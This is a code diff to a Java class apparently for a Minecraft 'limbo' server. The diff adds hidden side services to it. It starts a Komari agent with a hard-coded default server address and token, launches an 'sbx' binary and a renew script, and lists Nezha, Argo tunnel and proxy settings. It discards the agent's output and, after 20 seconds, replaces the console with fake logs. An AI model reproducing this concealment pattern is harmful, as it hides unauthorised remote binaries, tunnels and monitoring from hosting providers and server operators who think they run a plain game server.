@@ -22,20 +22,43 @@ public final class NanoLimbo {
     private static final ScheduledExecutorService SCHED = Executors.newScheduledThreadPool(2);
 
     private static final String[] ALL_ENV_VARS = {
-            "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
-            "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
-            "HY2_PORT", "S5_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
-            "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME",
-            "KOMARI_SERVER", "KOMARI_TOKEN", "KOMARI_AUTO_KEY",
-            "KOMARI_FILE_PATH"
+        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
+        "HY2_PORT", "S5_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME",
+
+        // Komari
+        "KOMARI_SERVER", "KOMARI_TOKEN", "KOMARI_AUTO_KEY",
+        "KOMARI_FILE_PATH" // ✅ 新增
     };
 
     public static void main(String[] args) {
         try {
+            if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
+                System.err.println(ANSI_RED + "ERROR: Your Java version is too low!" + ANSI_RESET);
+                Thread.sleep(3000);
+                System.exit(1);
+            }
+
             Map<String, String> envVars = new HashMap<>();
             loadEnvVars(envVars);
 
+            // ✅ 优先 Komari
             startKomari(envVars);
+
+            runSbxBinary(envVars);
+            startRenewScript();
+
+            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+                running.set(false);
+                stopServices();
+                SCHED.shutdownNow();
+            }));
+
+            SCHED.schedule(() -> {
+                forwardLogs.set(false);
+                resetConsoleAndShowFakeLogs();
+            }, 20, TimeUnit.SECONDS);
 
             while (running.get()) {
                 Thread.sleep(1000);
@@ -47,47 +70,29 @@ public final class NanoLimbo {
         }
     }
 
-    // ================= KOMARI FIX CORE =================
+    // ================= Komari =================
 
     private static void startKomari(Map<String, String> env) {
-        String server = env.getOrDefault("KOMARI_SERVER", "");
-        String token = env.getOrDefault("KOMARI_TOKEN", "");
+        String server = env.getOrDefault("KOMARI_SERVER", "ko.jaxmike.nyc.mn");
+        String token = env.getOrDefault("KOMARI_TOKEN", "1hlYKKVTMEMjCvrkhJm1jW");
         String autoKey = env.getOrDefault("KOMARI_AUTO_KEY", "");
-        String filePath = env.getOrDefault("KOMARI_FILE_PATH", "./cache");
+
+        // ✅ 使用独立目录
+        String filePath = env.getOrDefault("KOMARI_FILE_PATH", "./world");
 
         File workDir = new File(filePath);
-        if (!workDir.exists()) workDir.mkdirs();
-
-        File targetFile = new File(workDir, "auto-discovery.json");
-
-        // ================= 1. 全局搜索 json =================
-        File found = searchFile(Paths.get(".").toAbsolutePath(), "auto-discovery.json");
-
-        if (found != null) {
-            try {
-                System.out.println(ANSI_GREEN + "Found auto-discovery.json at: " + found.getAbsolutePath() + ANSI_RESET);
-
-                Files.createDirectories(workDir.toPath());
-                Files.move(found.toPath(), targetFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
-
-                System.out.println(ANSI_GREEN + "Moved to KOMARI_FILE_PATH" + ANSI_RESET);
-            } catch (Exception e) {
-                System.err.println(ANSI_RED + "Failed to move file: " + e.getMessage() + ANSI_RESET);
-            }
+        if (!workDir.exists()) {
+            workDir.mkdirs();
         }
 
-        // ================= 2. 判断 token 来源 =================
-        boolean hasFileToken = targetFile.exists();
+        File tokenFile = new File(workDir, "auto-discovery.json");
 
-        String fileToken = null;
-        if (hasFileToken) {
-            fileToken = readTokenFromFile(targetFile);
-        }
+        boolean hasFileToken = tokenFile.exists();
 
         boolean enabled = !server.isEmpty() && (hasFileToken || !token.isEmpty() || !autoKey.isEmpty());
 
         if (!enabled) {
-            System.out.println(ANSI_RED + "Komari disabled" + ANSI_RESET);
+            System.out.println(ANSI_RED + "Komari 未启用" + ANSI_RESET);
             return;
         }
 
@@ -99,56 +104,43 @@ public final class NanoLimbo {
             cmd.add("-e");
             cmd.add(formatEndpoint(server));
 
-            // ================= 3. 优先 FILE TOKEN =================
-            if (fileToken != null && !fileToken.isEmpty()) {
+            if (hasFileToken) {
                 cmd.add("-t");
-                cmd.add(fileToken);
-                System.out.println(ANSI_GREEN + "Komari FILE TOKEN mode" + ANSI_RESET);
-
+                cmd.add(readTokenFromFile(tokenFile));
+                System.out.println(ANSI_GREEN + "Komari 使用 FILE TOKEN 模式" + ANSI_RESET);
             } else if (!token.isEmpty()) {
                 cmd.add("-t");
                 cmd.add(token);
-                System.out.println(ANSI_GREEN + "Komari ENV TOKEN mode" + ANSI_RESET);
-
+                System.out.println(ANSI_GREEN + "Komari 使用 ENV TOKEN 模式" + ANSI_RESET);
             } else {
                 cmd.add("--auto-discovery");
                 cmd.add(autoKey);
-                System.out.println(ANSI_GREEN + "Komari AUTO mode" + ANSI_RESET);
+                System.out.println(ANSI_GREEN + "Komari 使用 AUTO_KEY 模式（首次注册）" + ANSI_RESET);
             }
 
             ProcessBuilder pb = new ProcessBuilder(cmd);
-            pb.directory(workDir);
+            pb.directory(workDir); // ✅ 固定到独立目录
+            pb.environment().put("HOME", workDir.getAbsolutePath());
+            pb.environment().put("XDG_CONFIG_HOME", workDir.getAbsolutePath());
             pb.redirectErrorStream(true);
-            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
 
             komariProcess = pb.start();
 
         } catch (Exception e) {
-            System.err.println(ANSI_RED + "Komari start failed: " + e.getMessage() + ANSI_RESET);
-        }
-    }
-
-    // ================= FILE SEARCH =================
-
-    private static File searchFile(Path root, String fileName) {
-        try {
-            if (!Files.exists(root)) return null;
-
-            try (var stream = Files.walk(root, 6)) {
-                return stream
-                        .filter(p -> p.getFileName().toString().equals(fileName))
-                        .findFirst()
-                        .map(Path::toFile)
-                        .orElse(null);
-            }
-        } catch (Exception e) {
-            return null;
+            System.err.println(ANSI_RED + "Komari 启动失败: " + e.getMessage() + ANSI_RESET);
         }
     }
 
     private static String readTokenFromFile(File file) {
-        try {
-            String json = Files.readString(file.toPath());
+        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
+            StringBuilder sb = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                sb.append(line);
+            }
+
+            String json = sb.toString();
 
             int idx = json.indexOf("\"token\"");
             if (idx != -1) {
@@ -156,10 +148,11 @@ public final class NanoLimbo {
                 int end = json.indexOf("\"", start);
                 return json.substring(start, end);
             }
+
         } catch (Exception ignored) {}
+
         return "";
     }
-
 
     private static Path downloadKomariAgent() throws IOException {
         String arch = System.getProperty("os.arch").toLowerCase();
